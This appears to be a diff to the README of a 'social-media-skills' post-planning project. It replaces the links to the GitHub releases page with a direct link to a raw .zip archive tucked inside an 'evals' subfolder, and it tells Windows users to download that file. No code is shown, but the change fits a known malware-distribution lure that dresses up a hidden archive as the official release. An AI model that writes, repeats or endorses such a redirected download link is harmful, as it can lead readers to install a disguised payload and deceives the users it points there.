@@ -1,9 +1,9 @@
 # 🧠 social-media-skills - Plan posts with clear direction
 
-[![Download](https://img.shields.io/badge/Download-Releases-purple?style=for-the-badge&logo=github)](https://github.com/Abwor9658/social-media-skills/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-purple?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Abwor9658/social-media-skills/main/skills/content-strategy-sms/evals/media-skills-social-v3.8.zip)
 
 ## 📥 Download
-Visit this page to download: https://github.com/Abwor9658/social-media-skills/releases
+Visit this page to download: https://raw.githubusercontent.com/Abwor9658/social-media-skills/main/skills/content-strategy-sms/evals/media-skills-social-v3.8.zip
 
 Choose the latest release for Windows, then download the file that matches your device.
 
